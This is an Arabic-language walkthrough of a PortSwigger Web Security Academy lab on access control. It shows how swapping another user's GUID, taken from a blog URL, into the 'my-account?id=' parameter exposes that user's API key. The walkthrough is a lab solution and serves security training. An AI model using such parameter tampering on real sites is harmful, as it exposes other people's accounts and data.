# [User ID controlled by request parameter with unpredictable user IDs](https://portswigger.net/web-security/access-control/lab-user-id-controlled-by-request-parameter-with-unpredictable-user-ids)

## **`الهدف`**
العثور على الـ `GUID` الخاص بـ `carlos` ومن ثم دخول حسابه وتقديم مفتاح الـ `API` الخاص به كحل.
## **`خطوات الحل`**
نقوم بالدخول إلى حساب `wiener:peter` ونبحث عن أى موضوع قام `carlos` بكتابته ونضغك على اسمه لندخل إلى الـ `URL` الذي يعرض المواضيع التي كتبها `Carlos` لنلاحظ أن الـ `URL` الخاص بهذه الصفحة يعرف الـ `ID` الخاص به
```URL
https://0a93003403e17bab808fc1be00a000a1.web-security-academy.net/blogs?userId=7294853d-88ee-40b9-a5fc-02f7218afd93
```

فنقوم بنسخه ووضعه في الـ `URL` الخاصة بصفحة `My account` في حسابنا 
``` URL
https://0a93003403e17bab808fc1be00a000a1.web-security-academy.net/my-account?id=7514ff7a-c73b-40b1-97d4-1be56927d379 
```

ليصبح هكذا 
```URL
https://0a93003403e17bab808fc1be00a000a1.web-security-academy.net/my-account?id=7294853d-88ee-40b9-a5fc-02f7218afd93
```

لنجد أننا دخلنا بنجاح إلى حساب `Carlos` ونجد مفتاح الـ `API` ظاهرًا فننسخه ثم نضغط على `Submit solution` ونضع مفتاح الـ `API` ونضغط `OK` لننتهي من حل اللاب.
## **`ترقيع الثغرة`**
**`الترقيع هو جزء كبير من ترقيع لاب` [User ID controlled by request parameter](./User-ID-controlled-by-request-parameter.md)
